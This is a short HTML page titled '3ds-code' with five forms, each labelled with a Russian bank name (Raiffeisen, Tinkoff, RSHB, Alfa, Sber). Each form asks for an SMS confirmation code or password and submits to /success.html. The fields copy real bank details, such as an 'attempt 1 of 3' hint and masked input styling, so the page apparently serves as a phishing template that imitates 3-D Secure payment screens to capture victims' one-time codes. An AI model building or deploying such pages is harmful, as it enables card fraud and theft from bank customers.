<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>3ds-code</title>
</head>
<body>
  <form action="/success.html">
    <h3>Райф</h3>
    <input placeholder="Введите код" class="in_sms" type="number" pattern="[0-9]*" autocomplete="one-time-code" id="sms_input" name="password">
    <br>
    <input type="submit" value="подтвердить">
  </form>

  <hr>
  <form action="/success.html">
    <h3>Тинькофф</h3>
    <input required="" autofocus="" class="ti" name="password" autocomplete="off" placeholder="••••" maxlength="4" pattern="[0-9]*" inputmode="numeric" x-inputmode="numeric" data-error="" oninput="this.value=this.value.replace(/[^0-9]/,&quot;&quot;)">
    <br>
    <input type="submit" value="подтвердить">
  </form>

  <hr>
  <form action="/success.html">
    <h3>РСХ</h3>
    <input id="pwd" name="pwd" type="password">
    <br>
    <input type="submit" value="подтвердить">
  </form>

  <hr>
  <form action="/success.html">
    <h3>Альфа</h3>
    <input id="pwdInputVisible" type="tel" name="pwdInputVisible" autocomplete="off" class="passwordInput input__control" title="Попытка 1 из 3" maxlength="5">
    <br>
    <input type="submit" value="подтвердить">
  </form>

  <hr>
  <form action="/success.html">
    <h3>Сбер</h3>
    <input class="big-input" id="psw_id" type="tel" name="PASSWORD" size="20" maxlength="20" autocomplete="off" pattern="[0-9]*" style="text-security: disc;-webkit-text-security: disc;-moz-text-security: disc;">
    <br>
    <input type="submit" value="подтвердить">
  </form>  

</body>
</html>
